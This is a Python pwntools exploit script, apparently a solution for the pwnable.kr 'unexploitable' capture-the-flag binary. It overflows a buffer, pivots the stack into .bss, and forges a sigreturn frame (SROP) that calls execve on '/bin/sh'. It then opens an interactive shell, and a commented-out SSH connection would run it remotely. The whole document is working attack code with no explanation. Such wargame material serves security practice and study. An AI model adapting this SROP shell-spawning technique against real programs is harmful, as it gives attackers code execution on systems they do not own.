#!/usr/bin/python
from pwn import *
context.log_level = 'debug'
p = process('unexploitable')
# cli = ssh(host='pwnable.kr',port=2222,user='unexploitable',password='guest')
# p = cli.run('/home/unexploitable/unexploitable')

syscall     = 0x0400560
bss_start   = 0x0601028
lea_rax_rbp = 0x040055B

gdb.attach(p,'b *0x0400571') # break at read
raw_input("################1################")
payload = "A" * 16 + p64(bss_start + 0x10) + p64(lea_rax_rbp)
p.send(payload)
log.success("round 1 ok.")
sleep(3)

raw_input("################2################")
default = p64(0); binsh = bss_start + 0x30 + 0x100 + 0x8
sig_frame = (
        p64(syscall) + default,     # 0x00 rt_sigreturn        uc_flag
        default * 2,                # 0x10 &uc                 uc_stack.ss_sp
        default * 2,                # 0x20 us_stack.ss_flags   uc_stack.ss_size
        default * 2,                # 0x30 r8                  r9
        default * 2,                # 0x40 r10                 r11
        default * 2,                # 0x50 r12                 r13
        default * 2,                # 0x60 r14                 r15
        p64(binsh) + default,       # 0x70 rdi                 rsi
        default * 2,                # 0x80 rbp                 rbx
        default + p64(0x3b),        # 0x90 rdx                 rax
        default * 2,                # 0xa0 rcx                 rsp
        p64(syscall) + default,     # 0xb0 rip                 eflags
        p64(0x33) + default,        # 0xc0 cs                  err
        default * 2,                # 0xd0 trapno              oldmask(unused)
        default * 2,                # 0xe0 cr2(segfault addr)  &fpstace
        default * 2,                # 0xf0 __reserved          sigmask
        "/bin/sh\x00"               
        )
payload = (
        "B" * 16,
        p64(bss_start + 0x30),
        p64(lea_rax_rbp),
        p64(0xdeadbeef) * 2,
        p64(0xea7cafe),
        ''.join(sig_frame)
        )
payload = ''.join(payload)
p.send(payload)
log.success("round 2 ok.")

raw_input("################3################")
payload = "C" * 15
p.send(payload)
log.success("round 3 ok.")

p.interactive()
